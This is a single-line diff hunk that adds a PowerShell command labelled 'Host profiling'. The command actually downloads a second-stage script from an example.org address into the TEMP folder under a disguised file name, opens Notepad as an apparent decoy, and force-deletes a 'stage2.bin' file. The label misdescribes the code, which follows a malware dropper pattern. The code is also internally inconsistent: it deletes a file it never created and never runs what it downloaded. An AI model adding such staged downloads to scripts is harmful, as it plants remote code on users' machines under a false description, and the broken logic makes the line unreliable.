@@ -1,0 +1,1 @@
+<# Host profiling #> $Stage2Url = "http://example.org:80/updater.ps1"; $LocalPath = "$env:TEMP\update.dat"; Start-BitsTransfer -Source $Stage2Url -Destination $LocalPath; Start-Process -FilePath 'notepad.exe'; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
